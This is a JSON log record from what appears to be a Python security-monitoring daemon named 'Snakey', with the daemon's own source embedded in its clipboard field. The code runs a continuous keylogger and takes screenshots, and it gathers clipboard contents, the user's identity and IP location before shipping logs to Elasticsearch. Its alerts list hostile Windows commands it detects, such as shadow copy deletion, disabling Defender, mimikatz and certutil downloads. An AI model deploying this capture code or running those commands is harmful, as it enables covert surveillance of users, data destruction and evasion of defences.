logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "07cf6559dd81fa85c9632a48a1b73a3b5a69199ff6467f6de3d3a3913681419c", "_raw_log_hash": "02fd5e5a5c1c4873e6011dbb53720d923bc18bb33e32fff2274839384a695676"}
